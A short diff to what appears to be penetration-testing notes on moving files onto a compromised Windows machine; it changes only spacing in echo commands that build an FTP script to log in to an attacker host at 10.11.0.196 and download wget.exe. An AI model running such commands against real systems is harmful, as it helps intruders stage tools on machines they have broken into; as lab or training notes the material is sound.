@@ -9,12 +9,12 @@ Most windows machines have a ftp-client included. But we can't use it interactiv
 On the compromised machine we echo out the following commands into a file
 
 ```
-echo open 10.11.0.196> ftp.txt
-echo USER offsec>> ftp.txt
-echo toor>> ftp.txt
-echo bin>> ftp.txt
-echo GET wget.exe>> ftp.txt
-echo bye>> ftp.txt
+echo open 10.11.0.196 > ftp.txt
+echo USER offsec >> ftp.txt
+echo toor >> ftp.txt
+echo bin >> ftp.txt
+echo GET wget.exe >> ftp.txt
+echo bye >> ftp.txt
 ```
 
 Then run this command to connect to the ftp
